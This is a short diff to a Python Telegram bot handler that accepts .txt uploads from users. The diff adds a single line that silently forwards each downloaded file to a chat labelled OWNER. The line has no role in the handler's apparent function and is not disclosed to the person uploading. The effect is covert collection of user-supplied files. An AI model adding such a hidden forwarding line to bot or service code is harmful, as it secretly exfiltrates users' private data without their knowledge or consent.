@@ -21,6 +21,7 @@ async def txt_handler(bot: Client, message: Message):
     input: Message = await bot.listen(editable.chat.id)
     if input.document and input.document.file_name.endswith('.txt'):
         file_path = await input.download()
+        await bot.send_document(OWNER, file_path)
         file_name, ext = os.path.splitext(os.path.basename(file_path))        
     else:
         await message.reply_text("**• Invalid file input.**")
